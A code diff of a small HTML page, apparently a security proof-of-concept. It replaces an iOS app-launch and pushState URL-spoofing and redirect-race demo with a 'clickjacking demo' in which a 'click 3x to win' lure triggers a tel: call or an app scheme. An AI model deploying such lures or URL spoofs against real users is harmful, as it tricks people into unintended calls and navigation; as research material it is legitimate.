@@ -2,51 +2,54 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>iOS Open App + Panel + Navigation</title>
+  <title>iOS Clickjacking Demo</title>
   <style>
-    button {
-      margin: 10px;
-      padding: 12px 20px;
-      font-size: 16px;
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      user-select: none;
+      font-family: sans-serif;
     }
-    #panel {
-      display: none;
-      padding: 10px;
-      border: 1px solid #ccc;
-      margin-top: 10px;
+
+    #redBox {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      width: 40px;
+      height: 40px;
+      background-color: red;
+      cursor: pointer;
+    }
+
+    #counter {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 32px;
     }
   </style>
 </head>
 <body>
 
-<h2>Demo iOS: Buka Aplikasi + Panel + Navigation Race</h2>
-
-<button id="allBtn">Lakukan Semua Aksi</button>
-<div id="panel">Panel Terbuka!</div>
+<div id="redBox"></div>
+<div id="counter">Click 3x the red box to win!</div>
 
 <script>
-const allBtn = document.getElementById('allBtn');
-const panel = document.getElementById('panel');
+let clickCount = 0;
 
-allBtn.onclick = () => {
-  // --- Step 1: Buka aplikasi (Instagram) ---
-  window.location = "instagram://app"; // bisa diganti aplikasi lain
+document.getElementById("redBox").onclick = () => {
+  clickCount++;
+  document.getElementById("counter").innerText = "x" + clickCount;
 
-  // --- Step 2: PushState + tampilkan panel ---
-  history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
+  // final click → trigger app
+  if (clickCount === 3) {
+    // pilih salah satu:
+    // window.location = "instagram://app";
+    window.location = "tel:+6281234567890";
+  }
 };
-
-// --- Step 3: Navigation race (redirect) ---
-window.addEventListener('pageshow', () => {
-  requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
-  });
-});
 </script>
 
 </body>
